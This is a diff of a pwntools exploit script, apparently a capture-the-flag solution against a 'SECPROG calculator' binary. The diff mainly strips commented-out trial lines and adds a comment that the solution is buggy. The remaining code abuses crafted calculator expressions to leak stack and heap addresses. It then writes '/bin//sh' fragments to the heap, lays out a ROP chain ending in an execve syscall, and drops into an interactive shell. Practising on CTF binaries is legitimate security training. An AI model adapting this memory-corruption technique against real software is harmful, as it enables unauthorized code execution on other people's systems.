@@ -5,18 +5,13 @@ def tohex(val, nbits):
   return hex((val + (1 << nbits)) % (1 << nbits))
 
 
-#context(terminal=['tmux', 'splitw', '-v'])
-
-#RUN TMUX FIRST OR THIS WONT WORK LOL
 context(terminal=['tmux', 'new-window'])
 
 context(os = 'linux', arch = 'x86_64')
 context.log_level = 'DEBUG'
 
 prev_stack_addy = 0
-#context.arch = 'i386'
 
-#p = gdb.debug('./start', 'b _start')
 if len(sys.argv) > 2 and sys.argv[1] == 'debug':
         p = gdb.debug('./calc', 'b *' + sys.argv[2])
 elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
@@ -32,7 +27,6 @@ def sendPayload(payload):
 
 def getStack():
     payload = "/11112111333344445555666677778+400"
-    #payload = "/11112111+400"
 
     p.recvuntil("=== Welcome to SECPROG calculator ===\n")
     p.sendline(payload)
@@ -95,7 +89,6 @@ def writeToHeap(stack, address, value, offset_1, offset_2, offset_3, operator):
     print 'int(tohex(x, 32), 0) :: ' + str(int(tohex(x, 32), 0))
 
     payload = "/6789867" + operator + str(int(tohex(x, 32), 0) - offset_3) + operator + str(value)
-    #payload = "/678984323-" + str(int(tohex(x, 32), 0) - offset_3)
     p.sendline(payload)
 
 
@@ -107,33 +100,19 @@ def writeToHeap(stack, address, value, offset_1, offset_2, offset_3, operator):
 stack_addy = getStack()
 heap_addy = getHeap(stack_addy)
 
-#writeToHeap(stack_addy, heap_addy, 0x68732f2f, 1604, 1, 27)  #//sh
-#writeToHeap(stack_addy, heap_addy, 50882149, 1604, 1, 27, "+")  #//sh
-#writeToHeap(stack_addy, heap_addy, 993406714, 1604, 1, 27, "+")  #//sh
+
+
+#this solution is way over complicated and a little bugged, you need to send a com
 writeToHeap(stack_addy, heap_addy, 100892645, 1604, 1, 27, "+")  #//sh
 writeToHeap(stack_addy, heap_addy, 2, 1604, 1, 27, "+")  #//sh
 writeToHeap(stack_addy, heap_addy, 893385722, 1604, 1, 26, "+")  #//sh
 writeToHeap(stack_addy, heap_addy, 117570246, 1604, 1, 25, "-")  #//sh
 
-
-#writeToHeap(stack_addy, stack_addy, 100000000, 1548, 1, 25, "-")  #//sh  32
-
-#writeToHeap(stack_addy, heap_addy, 100020951, 1604, 1, 28)  #/bin
-
-#writeToHeap(stack_addy, heap_addy, 0x6e69622f, 1604, 1, 25)  #/bin
-#writeToHeap(stack_addy, heap_addy, 0x6e69622f, 1604, 1, 25)  #/bin
-#writeToHeap(stack_addy, heap_addy, 0x6e69622f, 1604, 1, 25)  #/bin
-
-#writeToStack(stack_addy, 160, 402, 0x80bc4f6)
 writeToStack(stack_addy, 160, 402, 0x080701d0)
-#writeToStack(stack_addy, 160, 402, 0x080701d0)
 writeToStack(stack_addy, 160, 404, int(heap_addy, 0)-128)
-#writeToStack(stack_addy, 160, 404, int(heap_addy, 0)-120)
-#writeToStack(stack_addy, 160, 406, 0x080701a8)
 writeToStack(stack_addy, 160, 406, 0x080534ab)
 writeToStack(stack_addy, 160, 408, int(heap_addy, 0)-128)
 writeToStack(stack_addy, 160, 410, 0x080534a9)
-#writeToStack(stack_addy, 160, 410, 0x0807087e)
 writeToStack(stack_addy, 160, 412, int(heap_addy, 0)-112)
 writeToStack(stack_addy, 160, 414, 0x080bf46d)
 writeToStack(stack_addy, 160, 416, 0x080bf46d)
@@ -142,29 +121,11 @@ writeToStack(stack_addy, 160, 420, 0x080bf46d)
 writeToStack(stack_addy, 160, 422, 0x080bf46d)
 writeToStack(stack_addy, 160, 424, int(heap_addy, 0)-112)
 writeToStack(stack_addy, 160, 426, 0x080bede0)
-#writeToStack(stack_addy, 160, 424, 0x080bf6af)
-#writeToStack(stack_addy, 160, 426, int(heap_addy, 0)-112)
 writeToStack(stack_addy, 160, 428, 11)
 writeToStack(stack_addy, 160, 430, 0x0808c8ae)
 writeToStack(stack_addy, 160, 432, 0x8049a21)
 writeToStack(stack_addy, 160, 434, 0x8049a21)
-
-#writeOffsetToStack(stack_addy, 160, 432, 400)
-#writeOffsetToStack(stack_addy, 160, 434, 22000)
-#writeToStack(stack_addy, 160, 430, 0x080bf46f)
-#writeToStack(stack_addy, 160, 432, 0x080bee06)
-#writeToStack(stack_addy, 160, 434, 0x080bee08)
-#writeToStack(stack_addy, 160, 436, int(heap_addy, 0)-112)
-#writeToStack(stack_addy, 160, 438, int(heap_addy, 0)-112)
-#writeToStack(stack_addy, 160, 440, int(heap_addy, 0)-112)
-#writeToStack(stack_addy, 160, 406, int(heap_addy, 0)-112)
-#writeToStack(stack_addy, 160, 408, int(heap_addy, 0))
-#writeToStack(stack_addy, 160, 410, int(heap_addy, 0))
-#writeToStack(stack_addy, 160, 407, 0x77777777)
-
-
-#sendPayload("asdlknadna")
-
+p.sendline("")
 
 p.interactive()
 
